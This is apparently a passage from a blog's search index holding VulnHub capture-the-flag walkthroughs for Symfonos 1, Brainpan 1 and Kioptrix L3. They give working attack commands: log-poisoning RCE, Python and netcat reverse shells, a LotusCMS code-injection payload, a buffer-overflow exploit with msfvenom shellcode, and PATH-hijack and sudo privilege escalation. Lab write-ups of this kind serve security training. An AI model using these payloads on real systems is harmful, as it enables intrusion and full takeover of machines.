2.0.0 Ok: queued as 0CBB24081F 221 2.0.0 Bye Connection closed by foreign host. Include SMTP log file &amp;amp; test RCE http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;c=id; Check if python exists ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# curl -s &quot;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;c=which+python&quot; | grep python /usr/bin/python Execute Reverse Shell # Curl does not work http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;c=python+-c+&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.236.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; Obtained www-data shell ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.236.8. Ncat: Connection from 192.168.236.8:37968. $ whoami;id whoami;id helios uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev) Privilege EscalationRoot - Via SUID Binary (Path Hijacking) Search for SUID binaries helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$ find / -perm -4000 2&amp;gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /opt/statuscheck &amp;lt;- Suspicious /bin/mount /bin/umount /bin/su /bin/ping Execute /opt/statuscheck helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$ /opt/statuscheck HTTP/1.1 200 OK Date: Mon, 24 Jan 2022 03:51:47 GMT Server: Apache/2.4.25 (Debian) Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT ETag: &quot;148-58c6b9bb3bc5b&quot; Accept-Ranges: bytes Content-Length: 328 Vary: Accept-Encoding Content-Type: text/html curl localhost? View contents of /opt/statuscheck w/ strings Full Path of curl is not specified, susceptible to path hijacking Exploit Prepend /tmp to PATH environment export PATH=/tmp:$PATH Create curl, to spawn root shell helios@symfonos:/tmp$ printf &#39;cp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /tmp/curl; chmod 4777 /tmp/curl; helios@symfonos:/tmp$ cat /tmp/curl cp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash Execute /opt/statuscheck Obtain root shell helios@symfonos:/tmp$ /opt/statuscheck helios@symfonos:/tmp$ ls -la total 1088 drwxrwxrwt 2 root root 4096 Jan 23 22:00 . drwxr-xr-x 22 root root 4096 Jun 28 2019 .. -rwsrwxrwx 1 helios helios 54 Jan 23 21:58 curl -rwsr-xr-x 1 root helios 1099016 Jan 23 22:00 rootbash helios@symfonos:/tmp$ /tmp/rootbash -p rootbash-4.4# whoami root rootbash-4.4# Obtain Root Flag rootbash-4.4# cat proof.txt Congrats on rooting symfonos:1! \\ __ --==/////////////[})))==* / \\ &#39; ,| `\\`\\ //| ,| \\ `\\ //,/&#39; -~ | ) _-~~~\\ |/ / |&#39;| _-~ / , (( /&#39; ) | \\ / /&#39;/ _-~ _/_-~| ((( ; /` &#39; )/ /&#39;&#39; _ -~ _-~ ,/&#39; ) )) `~~\\ `\\\\/&#39;/|&#39; __--~~__--\\ _-~ _/, ((( )) / ~~ \\ /~ __--~~ --~~ __/~ _-~ / ((\\~\\ | ) | &#39; / __--~~ \\-~~ _-~ `\\(\\ __--( _/ |&#39;\\ / --~~ __--~&#39; _-~ ~| ( ((~~ __-~ \\~\\ / ___---~~ ~~\\~~__--~ ~~\\~~~~~~ `\\-~ \\~\\ / __--~~~&#39;~~/ ;\\ __.-~ ~-/ ~~~~~__\\__---~~ _..--._ ;;;;;;;;&#39; / ---~~~/_.-----.-~ _.._ ~\\ ;;;;;;;&#39; / ----~~/ `\\,~ `\\ \\ ;;;;&#39; ( ---~~/ `:::| `\\\\. |&#39; _ `----~~~~&#39; / `:| ()))), ______/\\/~ | / / (((((()) /~;;.____/;;&#39; / ___.---( `;;;/ )))&#39;`)) / // _;______;&#39;------~~~~~ |;;/\\ / (( ( // \\ \\ / | \\;;,\\ ` (&amp;lt;_ \\ \\ /&#39;,/-----&#39; _&amp;gt; \\_| \\\\_ //~;~~~~~~~~~ \\_| (,~~ \\~\\ ~~ Contact me via Twitter @zayotic to give feedback! rootbash-4.4# " }, { "title": "Vulnhub - Brainpan 1", "url": "/posts/Brainpan-1/", "categories": "Vulnhub, Windows", "tags": "bof/windows-bof, linux-priv-esc/sudo/gtfo-bin", "date": "2022-02-03 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Thu Feb 3 02:21:55 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/brainpan-1/192.168.110.9/scans/_full_tcp_nmap.txt -oX /root/vulnHub/brainpan-1/192.168.110.9/scans/xml/_full_tcp_nmap.xml 192.168.110.9Nmap scan report for 192.168.110.9Host is up, received arp-response (0.00069s latency).Scanned at 2022-02-03 02:22:10 +08 for 60sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION9999/tcp open abyss? syn-ack ttl 64| fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _|| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|| [________________________ WELCOME TO BRAINPAN _________________________]|_ ENTER THE PASSWORD10000/tcp open http syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.3)|_http-server-header: SimpleHTTP/0.6 Python/2.7.31 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9999-TCP:V=7.92%I=9%D=2/3%Time=61FACBDF%P=x86_64-pc-linux-gnu%r(NULSF:L,298,&quot;_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\SF:x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\xSF:20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x2SF:0\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2SF:0\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2SF:0\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\|\\SF:x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2SF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2SF:0_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x2SF:0\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\SF:|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x2SF:0_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\xSF:20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x2SF:0_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x2SF:0THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\xSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;gt;&amp;gt;\\x20&quot;);MAC Address: 08:00:27:15:B9:4B (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.10TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/3%OT=9999%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61OS:FACC0E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=OS:8)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=M5OS:B4ST11NW5%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=389OS:0)ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%AOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0OS:%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)UOS:1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 198.049 days (since Tue Jul 20 01:12:11 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTEHOP RTT ADDRESS1 0.69 ms 192.168.110.9Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb 3 02:23:10 2022 -- 1 IP address (1 host up) scanned in 75.50 secondsTCP/9999 BOF executable runningTCP/10000 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/brainpan-1]└─# ffuf -u http://$ip:10000/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.9:10000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ [Status: 200, Size: 215, Words: 7, Lines: 9]bin [Status: 301, Size: 0, Words: 1, Lines: 1]index.html [Status: 200, Size: 215, Words: 7, Lines: 9]:: Progress: [4615/4615] :: Job [1/1] :: 6768 req/sec :: Duration: [0:00:30] :: Errors: 15 :: bin contains the BOF executable Initial FootholdTCP/10000 (HTTP) - BOF Binary Proceed to /bin to download the BOF binary ┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit] └─# wget http://192.168.110.9:10000/bin/brainpan.exe -q Transfer it to Windows machine to create a payload.BOF Determine min buffer size till EIP overflows with A Program crashed at 600As EIP is filled with As. Determine EIP via msf-pattern_create ┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit] └─# msf-pattern_create -l 600 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9 Pattern Address: 35724134 Determine EIP offset via msf-pattern_offset ┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit] └─# msf-pattern_offset -q 35724134 [*] Exact match at offset 524 or via mona !mona findmsp -distance 600 EIP offset: 524 Test with Bs buffer = b&quot;A&quot; * 524 + b&quot;B&quot; * 4 Make sure 42424242 is at EIP Determine badchars badChars: \\x00 badChars: \\x00 Determine JMP Module must not have any protection settings False: Rebase, SafeSEH, ASLR, NXCompact, OS DLL Pick a module that belongs to to the bufferoverflow.exe JMP Addr must not have any of the identified badChars # Method 1: !mona jmp -r esp !mona jmp -r esp -cpb &quot;badChars&quot; # Method 2: 1. !mona modules 2. Pick a module that belongs to the bufferoverflow.exe 3. !mona find -s &quot;xff\\xef&quot; -m &amp;lt;module name&amp;gt;, (etc; essfunc.dll) 4. Pick a return addr (Must not contain any badChars) # Method 3: Top-Left box -&amp;gt; Right-Click -&amp;gt; Search For -&amp;gt; All commands in all modules -&amp;gt; Type JMP ESP Return Address: 0x311712f3 - brainpan.exe Little Endian: \\xf3\\x12\\x17\\x31 Make sure EIP points to the selected JMP Address Check bp 0x311712f3 EIP Points to brainpan.exe Generate Shellcode msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 EXITFUNC=thread -b &#39;\\x00&#39; -f python Exploit offset (the number of As to reach EIP) returnAdd (EIP) NOP Shellcode buffer = b&quot;A&quot; * 524 + b&quot;\\xf3\\x12\\x17\\x31&quot; + NOP + buf Obtained shell on Windows Machine TCP/9999 - BOF Generate the payload again msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 EXITFUNC=thread -b &#39;\\x00&#39; -f python Change IP address in exploit.py Exploit Obtained shell, but the machine is Linux Switch payload to linux msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 EXITFUNC=thread -b &#39;\\x00&#39; -f python Restart Machine &amp;amp; Exploit Privilege EscalationRoot - Via Sudo (GTFO Bin) Check sudo access puck@brainpan:/$ sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util puck@brainpan:/$ Execute /home/anansi/bin/anansi_util , to see what it does puck@brainpan:/$ sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [action] Where [action] is one of: - network - proclist - manual [command] puck@brainpan:/$ manual, has a GTFOBins entry Exploit puck@brainpan:/$ sudo /home/anansi/bin/anansi_util manual man #!/bin/sh Obtain Root Flag # cat b.txt _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| http://www.techorganic.com Files brainpan.exe exploit.py genChars.py simpleFuzz.py" }, { "title": "Vulnhub - Kioptrix L3", "url": "/posts/Kioptrix-L3/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/web-app-cms-exploit, linux-priv-esc/linux-creds-found, linux-priv-esc/vulnerable-bin, linux-priv-esc/kernel-exploit", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Thu Jan 6 00:19:34 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/kioptrix3/192.168.1.95/scans/_full_tcp_nmap.txt -oX /root/vulnHub/kioptrix3/192.168.1.95/scans/xml/_full_tcp_nmap.xml 192.168.1.95Nmap scan report for 192.168.1.95Host is up, received arp-response (0.0032s latency).Scanned at 2022-01-06 00:19:35 +08 for 28sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)| ssh-hostkey: | 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBAL4CpDFXD9Zn2ONktcyGQL37Dn6s9JaOv3oKjxfdiABm9GjRkLEtbSAK3vhBBUJTZcVKYZk21lFHAqoe/+pLr4U9yOLOBbSoKNSxQ2VHN9FOLc9C58hKMF/0sjDsSIZnaI4zO7M4HmdEMYXONrmj2x6qczbfqecs+z4cEYVUF3R3AAAAFQCuG9mm7mLm1GGqZRSICZ+omMZkKQAAAIEAnj8NDH48hL+Pp06GWQZOlhte8JRZT5do6n8+bCgRSOvaYLYGoNi/GBzlET6tMSjWMsyhVY/YKTNTXRjqzS1DqbODM7M1GzLjsmGtVlkLoQafV6HJ25JsKPCEzSImjeOCpzwRP5opjmMrYBMjjKqtIlWYpaUijT4uR08tdaTxCukAAACBAJeJ9j2DTugDAy+SLCa0dZCH+jnclNo3o6oINF1FjzICdgDONL2YbBeU3CiAL2BureorAE0lturvvrIC2xVn2vHhrLpz6NPbDAkrLV2/rwoavbCkYGrwXdBHd5ObqBIkoUKbI1hGIGA51nafI2tjoXPfIeHeNOep20hgr32x9x1x| 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyOv6c+5ON+N+ZNDtjetiZ0eUxnIR1U0UqSF+a24Pz2xqdnJC1EN0O3zxGJB3gfPdJlyqUDiozbEth1GBP//8wbWsa1pLJOL1YmcumEJCsitngnrVN7huACG127UjKP8hArECjCHzc1P372gN3AQ/h5aZd0VV17e03HnAJ64ZziOQzVJ+DKWJbiHoXC2cdD1P+nlhK5fULe0QBvmA14gkl2LWA6KILHiisHZpF+V3X7NvXYyCSSI9GeXwhW4RKOCGdGVbjYf7d93K9gj0oU7dHrbdNKgX0WosuhMuXmKleHkIxfyLAILYWrRRj0GVdhZfbI99J3TYaR/yLTpb0D6mhw==80/tcp open http syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: Ligoat Security - Got Goat? Security ...|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-PatchMAC Address: 00:0C:29:03:05:C9 (VMware)Device type: general purpose|WAP|switch|media device|VoIP phone|storage-miscRunning (JUST GUESSING): Linux 2.6.X|2.4.X (99%), Linksys embedded (96%), Extreme Networks ExtremeXOS 15.X|12.X (94%), LifeSize embedded (94%), ShoreTel embedded (94%), LaCie embedded (94%)OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:linksys:wrv54g cpe:/o:extremenetworks:extremexos:15.3 cpe:/o:extremenetworks:extremexos:12.5.1 cpe:/o:linux:linux_kernel:2.4 cpe:/h:shoretel:8800 cpe:/o:linux:linux_kernel:2.6.31 cpe:/h:lacie:5big_network_2Aggressive OS guesses: Linux 2.6.9 - 2.6.33 (99%), Linux 2.6.22 (embedded, ARM) (98%), Linux 2.6.22 - 2.6.23 (98%), Linksys WRV54G WAP (96%), Linux 2.6.19 - 2.6.36 (95%), Linux 2.6.31 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.13 - 2.6.32 (95%), Extreme Networks ExtremeXOS 12.5.1 or 15.3 (94%), Linux 2.4.18 - 2.4.35 (likely embedded) (94%)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/6%OT=22%CT=1%CU=35166%PV=Y%DS=1%DC=D%G=Y%M=000C29%TMOS:=61D5C533%P=x86_64-pc-linux-gnu)SEQ(SP=D0%GCD=1%ISR=D3%TI=Z%CI=Z%II=I%TSOS:=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=MOS:5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16OS:A0)ECN(R=Y%DF=Y%TG=40%W=16D0%O=M5B4NNSNW5%CC=N%Q=)ECN(R=Y%DF=Y%T=40%W=16OS:D0%O=M5B4NNSNW5%CC=N%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DOS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%TG=40%W=16A0%S=O%A=S+%OS:F=AS%O=M5B4ST11NW5%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4SOS:T11NW5%RD=0%Q=)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%ROS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%WOS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=OS:0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TGOS:=40%CD=S)IE(R=Y%DFI=N%T=40%CD=S)Uptime guess: 0.002 days (since Thu Jan 6 00:17:46 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=205 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 3.15 ms 192.168.1.95Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Jan 6 00:20:03 2022 -- 1 IP address (1 host up) scanned in 29.80 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/kioptrix3]└─# ffuf -u http://192.168.1.107/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.php,.html,.txt&quot; -fw 24 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.107/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .php .html .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 24________________________________________________ [Status: 200, Size: 1819, Words: 167, Lines: 39]cache [Status: 301, Size: 353, Words: 23, Lines: 10]core [Status: 301, Size: 352, Words: 23, Lines: 10]favicon.ico [Status: 200, Size: 23126, Words: 13, Lines: 6]gallery [Status: 301, Size: 355, Words: 23, Lines: 10]index.php [Status: 200, Size: 1819, Words: 167, Lines: 39]index.php [Status: 200, Size: 1819, Words: 167, Lines: 39]modules [Status: 301, Size: 355, Words: 23, Lines: 10]phpmyadmin [Status: 301, Size: 358, Words: 23, Lines: 10]style [Status: 301, Size: 353, Words: 23, Lines: 10]update.php [Status: 200, Size: 18, Words: 2, Lines: 1]:: Progress: [18460/18460] :: Job [1/1] :: 15386 req/sec :: Duration: [0:00:01] :: Errors: 0 :: phpmyadmin update.phpInitial FootholdTCP/80 (HTTP) - Lotus CMS Exploit View enumerated directories update.php Permission Denied phpmyadmin index.php Proceed to login LotusCMS Search for LotusCMS Exploits Reference Manual Exploit Payload curl http://192.168.1.107/index.php --data &quot;page=index&#39;);${system(&#39;COMMAND TO EXECUTE&#39;)};#&quot; URL Encoded Payload curl http://192.168.1.107/index.php --data &quot;page=index%27%29%3B%24%7Bsystem%28%27COMMAND TO EXECUTE%27%29%7D%3B%23%22 URL Encode “COMMAND TO EXECUTE” ┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95] └─# hURL --URL &quot;echo -n Vulnerability Found&quot; Original :: echo -n Vulnerability Found URL ENcoded :: echo%20-n%20Vulnerability%20Found Check if target is susceptible ┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95] └─# curl http://192.168.1.107/index.php --data &quot;page=index%27%29%3B%24%7Bsystem%28%27echo%20-n%20Vulnerability%20Found%27%29%7D%3B%23%22&quot; | grep -ioP &quot;vulnerability found&quot; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1926 0 1838 100 88 802k 39338 --:--:-- --:--:-- --:--:-- 940k Vulnerability Found Execute Reverse Shell curl http://192.168.1.107/index.php --data &quot;page=index%27%29%3B%24%7Bsystem%28%27nc+192.168.1.1+4444+-e+/bin/bash%27%29%7D%3B%23%22 Obtained www-data shell ┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95/exploit2] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on 